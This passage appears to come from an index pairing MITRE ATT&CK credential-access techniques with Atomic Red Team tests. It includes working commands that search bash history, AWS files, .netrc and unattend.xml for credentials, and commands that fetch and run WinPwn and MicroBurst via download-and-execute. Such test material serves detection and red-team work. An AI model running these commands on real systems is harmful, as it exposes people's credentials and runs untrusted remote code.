      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1649
    atomic_tests:
    - name: Staging Local Certificates via Export-Certificate
      auto_generated_guid: eb121494-82d1-4148-9e2b-e624e03fbf3d
      description: 'Export all user certificates and add to a compressed archive.

        '
      supported_platforms:
      - windows
      executor:
        command: |
          $archive="$env:PUBLIC\T1649\atomic_certs.zip"
          $exfilpath="$env:PUBLIC\T1649\certs"
          Add-Type -assembly "system.io.compression.filesystem"
          Remove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore
          mkdir $exfilpath | Out-Null
          foreach ($cert in (gci Cert:\CurrentUser\My)) { Export-Certificate -Cert $cert -FilePath $exfilpath\$($cert.FriendlyName).cer}
          [io.compression.zipfile]::CreateFromDirectory($exfilpath, $archive)
        cleanup_command: |
          $exfilpath="$env:PUBLIC\T1649\certs"
          Remove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore
        name: powershell
  T1552.003:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--8187bd2a-866f-4457-9009-86b0ddedffa3
      type: attack-pattern
      created: '2020-02-04T13:02:11.685Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1552.003
        url: https://attack.mitre.org/techniques/T1552/003
      - url: http://www.slideshare.net/StephanBorosh/external-to-da-the-os-x-way
        description: Alex Rymdeko-Harvey, Steve Borosh. (2016, May 14). External to
          DA, the OS X Way. Retrieved July 3, 2017.
        source_name: External to DA, the OS X Way
      modified: '2022-03-08T21:34:44.728Z'
      name: 'Unsecured Credentials: Bash History'
      description: 'Adversaries may search the bash command history on compromised
        systems for insecurely stored credentials. Bash keeps track of the commands
        users type on the command-line with the "history" utility. Once a user logs
        out, the history is flushed to the user‚Äôs <code>.bash_history</code> file.
        For each user, this file resides at the same location: <code>~/.bash_history</code>.
        Typically, this file keeps track of the user‚Äôs last 500 commands. Users often
        type usernames and passwords on the command-line as parameters to programs,
        which then get saved to this file when they log out. Adversaries can abuse
        this by looking through the file for potential credentials. (Citation: External
        to DA, the OS X Way)'
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_detection: Monitoring when the user's <code>.bash_history</code> is
        read can help alert to suspicious activity. While users do typically rely
        on their history of commands, they often access this history through other
        utilities like "history" instead of commands like <code>cat ~/.bash_history</code>.
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.1'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Command: Command Execution'
      - 'File: File Access'
      x_mitre_permissions_required:
      - User
      identifier: T1552.003
    atomic_tests:
    - name: Search Through Bash History
      auto_generated_guid: 3cfde62b-7c33-4b26-a61e-755d6131c8ce
      description: 'Search through bash history for specifice commands we want to
        capture

        '
      supported_platforms:
      - linux
      - macos
      input_arguments:
        output_file:
          description: Path where captured results will be placed
          type: path
          default: "~/loot.txt"
        bash_history_grep_args:
          description: grep arguments that filter out specific commands we want to
            capture
          type: path
          default: "-e '-p ' -e 'pass' -e 'ssh'"
        bash_history_filename:
          description: Path of the bash history file to capture
          type: path
          default: "~/.bash_history"
      executor:
        command: 'cat #{bash_history_filename} | grep #{bash_history_grep_args} >
          #{output_file}

          '
        name: sh
  T1552.001:
    technique:
      modified: '2023-03-30T21:01:44.951Z'
      name: 'Unsecured Credentials: Credentials In Files'
      description: |-
        Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.

        It is possible to extract passwords from backups or saved virtual machines through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). (Citation: CG 2014) Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller. (Citation: SRD GPP)

        In cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files.(Citation: Unit 42 Hildegard Malware) They may also be found as parameters to deployment commands in container logs.(Citation: Unit 42 Unsecured Docker Daemons) In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.(Citation: Specter Ops - Cloud Credential Storage)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_contributors:
      - Rory McCune, Aqua Security
      - Jay Chen, Palo Alto Networks
      - Yossi Weizman, Azure Defender Research Team
      - Vishwas Manral, McAfee
      - Microsoft Threat Intelligence Center (MSTIC)
      x_mitre_detection: 'While detecting adversaries accessing these files may be
        difficult without knowing they exist in the first place, it may be possible
        to detect adversary use of credentials they have obtained. Monitor the command-line
        arguments of executing processes for suspicious words or regular expressions
        that may indicate searching for a password (for example: password, pwd, login,
        secure, or credentials). See [Valid Accounts](https://attack.mitre.org/techniques/T1078)
        for more information.'
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - Windows
      - IaaS
      - Linux
      - macOS
      - Containers
      x_mitre_version: '1.1'
      x_mitre_data_sources:
      - 'File: File Access'
      - 'Command: Command Execution'
      x_mitre_permissions_required:
      - Administrator
      - SYSTEM
      - User
      x_mitre_system_requirements:
      - Access to files
      type: attack-pattern
      id: attack-pattern--837f9164-50af-4ac0-8219-379d8a74cefc
      created: '2020-02-04T12:52:13.006Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1552/001
        external_id: T1552.001
      - source_name: CG 2014
        description: CG. (2014, May 20). Mimikatz Against Virtual Machine Memory Part
          1. Retrieved November 12, 2014.
        url: http://carnal0wnage.attackresearch.com/2014/05/mimikatz-against-virtual-machine-memory.html
      - source_name: SRD GPP
        description: 'Security Research and Defense. (2014, May 13). MS14-025: An
          Update for Group Policy Preferences. Retrieved January 28, 2015.'
        url: http://blogs.technet.com/b/srd/archive/2014/05/13/ms14-025-an-update-for-group-policy-preferences.aspx
      - source_name: Unit 42 Hildegard Malware
        description: 'Chen, J. et al. (2021, February 3). Hildegard: New TeamTNT Cryptojacking
          Malware Targeting Kubernetes. Retrieved April 5, 2021.'
        url: https://unit42.paloaltonetworks.com/hildegard-malware-teamtnt/
      - source_name: Unit 42 Unsecured Docker Daemons
        description: Chen, J.. (2020, January 29). Attacker's Tactics and Techniques
          in Unsecured Docker Daemons Revealed. Retrieved March 31, 2021.
        url: https://unit42.paloaltonetworks.com/attackers-tactics-and-techniques-in-unsecured-docker-daemons-revealed/
      - source_name: Specter Ops - Cloud Credential Storage
        description: Maddalena, C.. (2018, September 12). Head in the Clouds. Retrieved
          October 4, 2019.
        url: https://posts.specterops.io/head-in-the-clouds-bd038bb69e48
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      identifier: T1552.001
    atomic_tests:
    - name: Find AWS credentials
      auto_generated_guid: 2b93758e-a8d7-4e3b-bc7b-d3aa8d7ecb17
      description: 'Find local AWS credentials from file, defaults to using / as the
        look path.

        '
      supported_platforms:
      - macos
      - linux
      input_arguments:
        file_path:
          description: Path to search
          type: string
          default: "/"
      executor:
        command: 'find #{file_path} -name "credentials" -type f -path "*/.aws/*" 2>/dev/null

          '
        name: sh
    - name: Extract Browser and System credentials with LaZagne
      auto_generated_guid: 9e507bb8-1d30-4e3b-a49b-cb5727d7ea79
      description: "[LaZagne Source](https://github.com/AlessandroZ/LaZagne)\n"
      supported_platforms:
      - macos
      executor:
        command: 'python2 laZagne.py all

          '
        elevation_required: true
        name: bash
    - name: Extract passwords with grep
      auto_generated_guid: bd4cf0d1-7646-474e-8610-78ccf5a097c4
      description: 'Extracting credentials from files

        '
      supported_platforms:
      - macos
      - linux
      input_arguments:
        file_path:
          description: Path to search
          type: string
          default: "/"
      executor:
        command: |
          grep -ri password #{file_path}
          exit 0
        name: sh
    - name: Extracting passwords with findstr
      auto_generated_guid: 0e56bf29-ff49-4ea5-9af4-3b81283fd513
      description: 'Extracting Credentials from Files. Upon execution, the contents
        of files that contain the word "password" will be displayed.

        '
      supported_platforms:
      - windows
      executor:
        command: |
          findstr /si pass *.xml *.doc *.txt *.xls
          ls -R | select-string -ErrorAction SilentlyContinue -Pattern password
        name: powershell
    - name: Access unattend.xml
      auto_generated_guid: 367d4004-5fc0-446d-823f-960c74ae52c3
      description: |
        Attempts to access unattend.xml, where credentials are commonly stored, within the Panther directory where installation logs are stored.
        If these files exist, their contents will be displayed. They are used to store credentials/answers during the unattended windows install process.
      supported_platforms:
      - windows
      executor:
        command: |
          type C:\Windows\Panther\unattend.xml
          type C:\Windows\Panther\Unattend\unattend.xml
        name: command_prompt
        elevation_required: true
    - name: Find and Access Github Credentials
      auto_generated_guid: da4f751a-020b-40d7-b9ff-d433b7799803
      description: 'This test looks for .netrc files (which stores github credentials
        in clear text )and dumps its contents if found.

        '
      supported_platforms:
      - macos
      - linux
      input_arguments:
        file_path:
          description: Path to search
          type: string
          default: "/home"
      executor:
        name: bash
        elevation_required: false
        command: 'for file in $(find #{file_path} -type f -name .netrc 2> /dev/null);do
          echo $file ; cat $file ; done

          '
    - name: WinPwn - sensitivefiles
      auto_generated_guid: 114dd4e3-8d1c-4ea7-bb8d-8d8f6aca21f0
      description: Search for sensitive files on this local system using the SensitiveFiles
        function of WinPwn
      supported_platforms:
      - windows
      executor:
        command: |-
          $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
          sensitivefiles -noninteractive -consoleoutput
        name: powershell
    - name: WinPwn - Snaffler
      auto_generated_guid: fdd0c913-714b-4c13-b40f-1824d6c015f2
      description: Check Domain Network-Shares for cleartext passwords using Snaffler
        function of WinPwn
      supported_platforms:
      - windows
      executor:
        command: |-
          $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
          Snaffler -noninteractive -consoleoutput
        name: powershell
    - name: WinPwn - powershellsensitive
      auto_generated_guid: 75f66e03-37d3-4704-9520-3210efbe33ce
      description: Check Powershell event logs for credentials or other sensitive
        information via winpwn powershellsensitive function.
      supported_platforms:
      - windows
      executor:
        command: |-
          $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
          powershellsensitive -consoleoutput -noninteractive
        name: powershell
    - name: WinPwn - passhunt
      auto_generated_guid: 00e3e3c7-6c3c-455e-bd4b-461c7f0e7797
      description: Search for Passwords on this system using passhunt via WinPwn
      supported_platforms:
      - windows
      executor:
        command: |-
          $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
          passhunt -local $true -noninteractive
        cleanup_command: |-
          rm -force .\passhunt.exe -ErrorAction Ignore
          rm -force .\phunter* -ErrorAction Ignore
          rm -force -recurse .\DomainRecon -ErrorAction Ignore
          rm -force -recurse .\Exploitation -ErrorAction Ignore
          rm -force -recurse .\LocalPrivEsc -ErrorAction Ignore
          rm -force -recurse .\LocalRecon -ErrorAction Ignore
          rm -force -recurse .\Vulnerabilities -ErrorAction Ignore
        name: powershell
    - name: WinPwn - SessionGopher
      auto_generated_guid: c9dc9de3-f961-4284-bd2d-f959c9f9fda5
      description: Launches SessionGopher on this system via WinPwn
      supported_platforms:
      - windows
      executor:
        command: |-
          $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
          sessionGopher -noninteractive -consoleoutput
        name: powershell
    - name: WinPwn - Loot local Credentials - AWS, Microsoft Azure, and Google Compute
        credentials
      auto_generated_guid: aaa87b0e-5232-4649-ae5c-f1724a4b2798
      description: Loot local Credentials - AWS, Microsoft Azure, and Google Compute
        credentials technique via function of WinPwn
      supported_platforms:
      - windows
      executor:
        command: "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object
          net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nSharpCloud
          -consoleoutput -noninteractive  "
        name: powershell
  T1606.001:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      - SaaS
      - IaaS
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Jen Burns, HubSpot
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--861b8fd2-57f3-4ee1-ab5d-c19c3b8c7a4a
      type: attack-pattern
      created: '2020-12-17T02:14:34.178Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1606.001
        url: https://attack.mitre.org/techniques/T1606/001
      - description: Rehberger, J. (2018, December). Pivot to the Cloud using Pass
          the Cookie. Retrieved April 5, 2019.
        url: https://wunderwuzzi23.github.io/blog/passthecookie.html
        source_name: Pass The Cookie
      - source_name: Volexity SolarWinds
        url: https://www.volexity.com/blog/2020/12/14/dark-halo-leverages-solarwinds-compromise-to-breach-organizations/
        description: Cash, D. et al. (2020, December 14). Dark Halo Leverages SolarWinds
          Compromise to Breach Organizations. Retrieved December 29, 2020.
      - source_name: Unit 42 Mac Crypto Cookies January 2019
        url: https://unit42.paloaltonetworks.com/mac-malware-steals-cryptocurrency-exchanges-cookies/
        description: Chen, Y., Hu, W., Xu, Z., et. al. (2019, January 31). Mac Malware
          Steals Cryptocurrency Exchanges‚Äô Cookies. Retrieved October 14, 2019.
      modified: '2021-09-20T16:48:28.041Z'
      name: Web Cookies
      description: |-
        Adversaries may forge web cookies that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies to authenticate and authorize user access.

        Adversaries may generate these cookies in order to gain access to web resources. This differs from [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539) and other similar behaviors in that the cookies are new and forged by the adversary, rather than stolen or intercepted from legitimate users. Most common web applications have standardized and documented cookie values that can be generated using provided tools or interfaces.(Citation: Pass The Cookie) The generation of web cookies often requires secret values, such as passwords, [Private Keys](https://attack.mitre.org/techniques/T1552/004), or other cryptographic seed values.

        Once forged, adversaries may use these web cookies to access resources ([Web Session Cookie](https://attack.mitre.org/techniques/T1550/004)), which may bypass multi-factor and other authentication protection mechanisms.(Citation: Volexity SolarWinds)(Citation: Pass The Cookie)(Citation: Unit 42 Mac Crypto Cookies January 2019)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_detection: Monitor for anomalous authentication activity, such as logons
        or other user session activity associated with unknown accounts. Monitor for
        unexpected and abnormal access to resources, including access of websites
        and cloud-based applications by the same user in different locations or by
        different systems that do not match expected configurations.
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.1'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Web Credential: Web Credential Usage'
      - 'Logon Session: Logon Session Creation'
    atomic_tests: []
  T1528:
    technique:
      x_mitre_platforms:
      - SaaS
      - Office 365
      - Azure AD
      - Google Workspace
      - Containers
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Suzy Schapperle - Microsoft Azure Red Team
      - Shailesh Tiwary (Indian Army)
      - Mark Wee
      - Jeff Sakowicz, Microsoft Identity Developer Platform Services (IDPM Services)
      - Saisha Agrawal, Microsoft Threat Intelligent Center (MSTIC)
      - Ram Pliskin, Microsoft Azure Security Center
      - Jen Burns, HubSpot
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      type: attack-pattern
      id: attack-pattern--890c9858-598c-401d-a4d5-c67ebcdd703a
      created: '2019-09-04T15:54:25.684Z'
      x_mitre_version: '1.2'
      external_references:
      - source_name: mitre-attack
        external_id: T1528
        url: https://attack.mitre.org/techniques/T1528
      - source_name: Amnesty OAuth Phishing Attacks, August 2019
        url: https://www.amnesty.org/en/latest/research/2019/08/evolving-phishing-attacks-targeting-journalists-and-human-rights-defenders-from-the-middle-east-and-north-africa/
        description: Amnesty International. (2019, August 16). Evolving Phishing Attacks
          Targeting Journalists and Human Rights Defenders from the Middle-East and
          North Africa. Retrieved October 8, 2019.
      - source_name: Auth0 Understanding Refresh Tokens
        url: https://auth0.com/learn/refresh-tokens/
        description: Auth0 Inc.. (n.d.). Understanding Refresh Tokens. Retrieved December
          16, 2021.
      - source_name: Auth0 - Why You Should Always Use Access Tokens to Secure APIs
          Sept 2019
        url: https://auth0.com/blog/why-should-use-accesstokens-to-secure-an-api/
        description: Auth0. (n.d.). Why You Should Always Use Access Tokens to Secure
          APIs. Retrieved September 12, 2019.
      - source_name: Trend Micro Pawn Storm OAuth 2017
        url: https://blog.trendmicro.com/trendlabs-security-intelligence/pawn-storm-abuses-open-authentication-advanced-social-engineering-attacks
        description: Hacquebord, F.. (2017, April 25). Pawn Storm Abuses Open Authentication
          in Advanced Social Engineering Attacks. Retrieved October 4, 2019.
      - source_name: Kubernetes Service Accounts
        url: https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/
        description: Kubernetes. (2022, February 26). Configure Service Accounts for
          Pods. Retrieved April 1, 2022.
      - source_name: Microsoft - Azure AD Identity Tokens - Aug 2019
        url: https://docs.microsoft.com/en-us/azure/active-directory/develop/access-tokens
        description: Microsoft. (2019, August 29). Microsoft identity platform access
          tokens. Retrieved September 12, 2019.
      - source_name: Microsoft - Azure AD App Registration - May 2019
        url: https://docs.microsoft.com/en-us/azure/active-directory/develop/quickstart-register-app
        description: 'Microsoft. (2019, May 8). Quickstart: Register an application
          with the Microsoft identity platform. Retrieved September 12, 2019.'
      - source_name: Microsoft - OAuth Code Authorization flow - June 2019
        url: https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-auth-code-flow
        description: Microsoft. (n.d.). Microsoft identity platform and OAuth 2.0
          authorization code flow. Retrieved September 12, 2019.
      - source_name: Microsoft Identity Platform Protocols May 2019
        url: https://docs.microsoft.com/en-us/azure/active-directory/develop/active-directory-v2-protocols
        description: Microsoft. (n.d.). Retrieved September 12, 2019.
      x_mitre_deprecated: false
      revoked: false
      description: "Adversaries can steal application access tokens as a means of
        acquiring credentials to access remote systems and resources.\n\nApplication
        access tokens are used to make authorized API requests on behalf of a user
        or service and are commonly used as a way to access resources in cloud and
        container-based applications and software-as-a-service (SaaS).(Citation: Auth0
        - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) OAuth
        is one commonly implemented framework that issues tokens to users for access
        to systems. Adversaries who steal account API tokens in cloud and containerized
        environments may be able to access data and perform actions with the permissions
        of these accounts, which can lead to privilege escalation and further compromise
        of the environment.\n\nIn Kubernetes environments, processes running inside
        a container communicate with the Kubernetes API server using service account
        tokens. If a container is compromised, an attacker may be able to steal the
        container‚Äôs token and thereby gain access to Kubernetes API commands.(Citation:
        Kubernetes Service Accounts)\n\nToken theft can also occur through social
        engineering, in which case user action may be required to grant access. An
        application desiring access to cloud-based services or protected APIs can
        gain entry using OAuth 2.0 through a variety of authorization protocols. An
        example commonly-used sequence is Microsoft's Authorization Code Grant flow.(Citation:
        Microsoft Identity Platform Protocols May 2019)(Citation: Microsoft - OAuth
        Code Authorization flow - June 2019) An OAuth access token enables a third-party
        application to interact with resources containing user data in the ways requested
        by the application without obtaining user credentials. \n \nAdversaries can
        leverage OAuth authorization by constructing a malicious application designed
        to be granted access to resources with the target user's OAuth token.(Citation:
        Amnesty OAuth Phishing Attacks, August 2019)(Citation: Trend Micro Pawn Storm
        OAuth 2017) The adversary will need to complete registration of their application
        with the authorization server, for example Microsoft Identity Platform using
        Azure Portal, the Visual Studio IDE, the command-line interface, PowerShell,
        or REST API calls.(Citation: Microsoft - Azure AD App Registration - May 2019)
        Then, they can send a [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002)
        to the target user to entice them to grant access to the application. Once
        the OAuth access token is granted, the application can gain potentially long-term
        access to features of the user account through [Application Access Token](https://attack.mitre.org/techniques/T1550/001).(Citation:
        Microsoft - Azure AD Identity Tokens - Aug 2019)\n\nApplication access tokens
        may function within a limited lifetime, limiting how long an adversary can
        utilize the stolen token. However, in some cases, adversaries can also steal
        application refresh tokens(Citation: Auth0 Understanding Refresh Tokens),
        allowing them to obtain new access tokens without prompting the user.  \n\n"
      modified: '2022-04-21T16:25:11.482Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      name: Steal Application Access Token
      x_mitre_detection: |-
        Administrators should set up monitoring to trigger automatic alerts when policy criteria are met. For example, using a Cloud Access Security Broker (CASB), admins can create a ‚ÄúHigh severity app permissions‚Ä? policy that generates alerts if apps request high severity permissions or send permissions requests for too many users.

        Security analysts can hunt for malicious apps using the tools available in their CASB, identity provider, or resource provider (depending on platform.) For example, they can filter for apps that are authorized by a small number of users, apps requesting high risk permissions, permissions incongruous with the app‚Äôs purpose, or apps with old ‚ÄúLast authorized‚Ä? fields. A specific app can be investigated using an activity log displaying activities the app has performed, although some activities may be mis-logged as being performed by the user. App stores can be useful resources to further investigate suspicious apps.

        Administrators can set up a variety of logs and leverage audit tools to monitor actions that can be conducted as a result of OAuth 2.0 access. For instance, audit reports enable admins to identify privilege escalation actions such as role creations or policy modifications, which could be actions performed after initial access.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_is_subtechnique: false
      x_mitre_data_sources:
      - 'User Account: User Account Modification'
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1528
    atomic_tests:
    - name: Azure - Dump All Azure Key Vaults with Microburst
      auto_generated_guid: 1b83cddb-eaa7-45aa-98a5-85fb0a8807ea
      description: |-
        Upon successful execution of this test, the names, locations, and contents of key vaults within an Azure account will be output to a file.
        See - https://www.netspi.com/blog/technical/cloud-penetration-testing/a-beginners-guide-to-gathering-azure-passwords/
      supported_platforms:
      - iaas:azure
      input_arguments:
        username:
          description: Azure AD username
          type: string
          default: 
        password:
          description: Azure AD password
          type: string
          default: T1082Az
        output_file:
          description: File to dump results to
          type: string
          default: "$env:temp\\T1528Test1.txt"
        subscription_id:
          description: Azure subscription id to search
          type: string
          default: 
      dependency_executor_name: powershell
      dependencies:
      - description: 'The Get-AzurePasswords script must exist in $env:temp.

          '
        prereq_command: 'if (test-path $env:temp\Get-AzurePasswords.ps1){exit 0} else
          {exit 1}

          '
        get_prereq_command: 'invoke-webrequest "https://raw.githubusercontent.com/NetSPI/MicroBurst/c771c665a2c71f9c5ba474869cd1c211ebee68fd/AzureRM/Get-AzurePasswords.ps1"
          -outfile "$env:temp\Get-AzurePasswords.ps1"

          '
      - description: 'The Azure RM module must be installed.

          '
        prereq_command: 'try {if (Get-InstalledModule -Name AzureRM -ErrorAction SilentlyContinue)
          {exit 0} else {exit 1}} catch {exit 1}

          '
        get_prereq_command: 'Install-Module -Name AzureRM -Force -allowclobber

          '
      - description: 'The Azure module must be installed.

          '
        prereq_command: 'try {if (Get-InstalledModule -Name Azure -ErrorAction SilentlyContinue)
          {exit 0} else {exit 1}} catch {exit 1}

          '
        get_prereq_command: 'Install-Module -Name Azure -Force -allowclobber

          '
      executor:
        command: |
          import-module "$env:temp\Get-AzurePasswords.ps1"
          $Password = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
          $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Password
          Connect-AzureRmAccount -Credential $Credential
          Get-AzurePasswords -subscription '#{subscription_id}' > #{output_file}
          cat #{output_file}
        cleanup_command: 'remove-item #{output_file} -force -erroraction silentlycontinue

          '
        name: powershell
        elevation_required: true
  T1552.006:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--8d7bd4f5-3a89-4453-9c82-2c8894d5655e
      type: attack-pattern
      created: '2020-02-11T18:43:06.253Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1552.006
        url: https://attack.mitre.org/techniques/T1552/006
      - source_name: Microsoft GPP 2016
        url: https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn581922(v%3Dws.11)
        description: Microsoft. (2016, August 31). Group Policy Preferences. Retrieved
          March 9, 2020.
      - url: https://msdn.microsoft.com/library/cc422924.aspx
        description: Microsoft. (n.d.). 2.2.1.1.4 Password Encryption. Retrieved April
          11, 2018.
        source_name: Microsoft GPP Key
      - url: https://obscuresecurity.blogspot.co.uk/2012/05/gpp-password-retrieval-with-powershell.html
        description: Campbell, C. (2012, May 24). GPP Password Retrieval with PowerShell.
          Retrieved April 11, 2018.
        source_name: Obscuresecurity Get-GPPPassword
      - description: Sean Metcalf. (2015, December 28). Finding Passwords in SYSVOL
          & Exploiting Group Policy Preferences. Retrieved February 17, 2020.
        url: https://adsecurity.org/?p=2288
        source_name: ADSecurity Finding Passwords in SYSVOL
      modified: '2020-06-17T14:25:38.082Z'
      name: 'Unsecured Credentials: Group Policy Preferences'
      description: |
        Adversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP). GPP are tools that allow administrators to create domain policies with embedded credentials. These policies allow administrators to set local accounts.(Citation: Microsoft GPP 2016)

        These group policies are stored in SYSVOL on a domain controller. This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made public).(Citation: Microsoft GPP Key)

        The following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:

        * Metasploit‚Äôs post exploitation module: <code>post/windows/gather/credentials/gpp</code>
        * Get-GPPPassword(Citation: Obscuresecurity Get-GPPPassword)
        * gpprefdecrypt.py

        On the SYSVOL share, adversaries may use the following command to enumerate potential GPP XML files: <code>dir /s * .xml</code>
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_detection: "Monitor for attempts to access SYSVOL that involve searching
        for XML files. \n\nDeploy a new XML file with permissions set to Everyone:Deny
        and monitor for Access Denied errors.(Citation: ADSecurity Finding Passwords
        in SYSVOL)"
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Command: Command Execution'
      - 'File: File Access'
      x_mitre_permissions_required:
      - User
      identifier: T1552.006
    atomic_tests:
    - name: GPP Passwords (findstr)
      auto_generated_guid: 870fe8fb-5e23-4f5f-b89d-dd7fe26f3b5f
      description: 'Look for the encrypted cpassword value within Group Policy Preference
        files on the Domain Controller. This value can be decrypted with gpp-decrypt
        on Kali Linux.

        '
      supported_platforms:
      - windows
      dependency_executor_name: powershell
      dependencies:
      - description: 'Computer must be domain joined

          '
        prereq_command: 'if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
          {exit 0} else {exit 1}

          '
        get_prereq_command: 'Write-Host Joining this computer to a domain must be
          done manually

          '
      executor:
        command: 'findstr /S cpassword %logonserver%\sysvol\*.xml

          '
        name: command_prompt
    - name: GPP Passwords (Get-GPPPassword)
      auto_generated_guid: e9584f82-322c-474a-b831-940fd8b4455c
      description: |
        Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller.
        This test is intended to be run from a domain joined workstation, not on the Domain Controller itself.
        The Get-GPPPasswords.ps1 executed during this test can be obtained using the get-prereq_commands.

        Successful test execution will either display the credentials found in the GPP files or indicate "No preference files found".
      supported_platforms:
      - windows
      input_arguments:
        gpp_script_url:
          description: URL of the Get-GPPPassword PowerShell Script
          type: url
          default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/87630cac639f29c2adcb163f661f02890adf4bdd/Exfiltration/Get-GPPPassword.ps1
        gpp_script_path:
          description: Path to the Get-GPPPassword PowerShell Script
          type: path
          default: PathToAtomicsFolder\T1552.006\src\Get-GPPPassword.ps1
      dependency_executor_name: powershell
      dependencies:
      - description: 'Get-GPPPassword PowerShell Script must exist at #{gpp_script_path}

          '
        prereq_command: 'if(Test-Path "#{gpp_script_path}") {exit 0 } else {exit 1
          }

          '
        get_prereq_command: |
          New-Item -ItemType Directory (Split-Path "#{gpp_script_path}") -Force | Out-Null
          Invoke-WebRequest #{gpp_script_url} -OutFile "#{gpp_script_path}"
      - description: 'Computer must be domain joined

          '
